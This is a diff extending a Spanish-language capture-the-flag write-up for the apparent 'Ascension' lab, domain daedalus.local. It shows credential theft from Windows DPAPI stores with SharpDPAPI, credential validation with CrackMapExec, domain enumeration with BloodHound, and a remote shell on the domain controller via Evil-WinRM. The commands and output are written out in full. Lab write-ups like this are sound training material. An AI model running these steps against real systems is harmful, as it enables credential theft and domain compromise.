@@ -647,3 +647,106 @@ PS C:\Users\Administrator\Documents> type ..\Desktop\flag.txt
 ASCENSION{**************}
 PS C:\Users\Administrator\Documents>
 ```
+Se procedió a la implementación de SharpDPAPI con el objetivo de extraer credenciales del sistema. Para ello, se suministró la contraseña disponible, lo que permitió obtener las credenciales del usuario svc_backup.
+
+```powershell
+PS C:\Users\Administrator\Documents> upload SharpDPAPI.exe
+
+Info: Uploading SharpDPAPI.exe to C:\Users\Administrator\Documents\SharpDPAPI.exe
+
+Data: 202752 bytes of 202752 bytes copied
+
+Info: Upload successful!
+
+PS C:\Users\Administrator\Documents> .\SharpDPAPI.exe credentials /password:D43d4lusB1ll1ngB055  
+
+  __                 _   _       _ ___
+ (_  |_   _. ._ ._  | \ |_) /\  |_) |
+ __) | | (_| |  |_) |_/ |  /--\ |  _|_
+                |
+  v1.11.3
+
+
+[*] Action: User DPAPI Credential Triage
+
+[*] Will decrypt user masterkeys with password: D43d4lusB1ll1ngB055
+
+[*] Triaging Credentials for ALL users
+
+Folder       : C:\Users\Administrator\AppData\Local\Microsoft\Credentials\
+
+  CredFile           : 6C0FA35116FC27371A650B528FAEE6C0
+
+    guidMasterKey    : {f77aed43-beff-4c38-805d-656a7bc7097a}
+    size             : 560
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)
+    description      : Local Credential Data
+
+    [X] MasterKey GUID not in cache: {f77aed43-beff-4c38-805d-656a7bc7097a}
+
+Folder       : C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\
+
+  CredFile           : C48FA9BC4637C67CB306A191C3C91E23
+
+    guidMasterKey    : {56a4e7f0-7ae5-4a66-86c8-abb9aa484acd}
+    size             : 430
+    flags            : 0x20000000 (CRYPTPROTECT_SYSTEM)
+    algHash/algCrypt : 32772 (CALG_SHA) / 26115 (CALG_3DES)
+    description      : Enterprise Credential Data
+
+    LastWritten      : 10/14/2020 5:35:22 AM
+    TargetName       : Domain:interactive=DAEDALUS\svc_backup
+    TargetAlias      :
+    Comment          :
+    UserName         : DAEDALUS\svc_backup
+    Credential       : jkQ**********
+
+PS C:\Users\Administrator\Documents>
+```
+
+Se llevó a cabo una verificación de las credenciales del usuario svc_backup utilizando CrackMapExec, confirmando que estas credenciales son válidas a nivel de dominio.
+
+```bash
+❯ crackmapexec smb dc1.daedalus.local -u svc_backup -p jkQ**********
+SMB         daedalus.local  445    DC1              [*] Windows 10.0 Build 17763 x64 (name:DC1) (domain:daedalus.local) (signing:True) (SMBv1:False)  
+SMB         daedalus.local  445    DC1              [+] daedalus.local\svc_backup:jkQ**********
+```
+
+Con el fin de realizar una enumeración exhaustiva del dominio, se utilizó BloodHound. Se autenticó en BloodHound utilizando las credenciales del usuario svc_backup, y se guardó toda la información recopilada en un archivo ZIP para un posterior análisis y revisión.
+
+```powershell
+❯ bloodhound-python -u svc_backup -p jkQ********** -ns 192.168.10.6 -d daedalus.local -c All --zip  
+INFO: Found AD domain: daedalus.local
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc1.daedalus.local
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 2 computers
+INFO: Connecting to GC LDAP server: dc1.daedalus.local
+INFO: Connecting to LDAP server: dc1.daedalus.local
+INFO: Found 7 users
+INFO: Found 52 groups
+INFO: Found 2 gpos
+INFO: Found 7 ous
+INFO: Found 19 containers
+INFO: Found 1 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: WEB01.daedalus.local
+INFO: Querying computer: DC1.daedalus.local
+INFO: Done in 00M 34S
+INFO: Compressing output into 20230901100806_bloodhound.zip
+```
+
+Tras cargar el archivo ZIP en BloodHound y analizar los datos, se identificó que el usuario svc_backup es miembro del grupo "Remote Management Users". Esto indica que el usuario tiene permisos para conectarse a WinRM (Windows Remote Management), lo que facilita la administración remota de sistemas Windows en la red.
+
+Se procedió a establecer una conexión utilizando Evil-WinRM con el usuario svc_backup hacia el equipo DC1. Como resultado, se obtuvo una sesión de PowerShell que permitió leer una nueva bandera.
+
+```powershell
+❯ evil-winrm -i dc1.daedalus.local -u svc_backup -p jkQ********** 
+PS C:\Users\svc_backup.DAEDALUS\Documents> whoami
+daedalus\svc_backup
+PS C:\Users\svc_backup.DAEDALUS\Documents> type ..\Desktop\flag.txt
+ASCENSION{***********8****}
+PS C:\Users\svc_backup.DAEDALUS\Documents>
+```
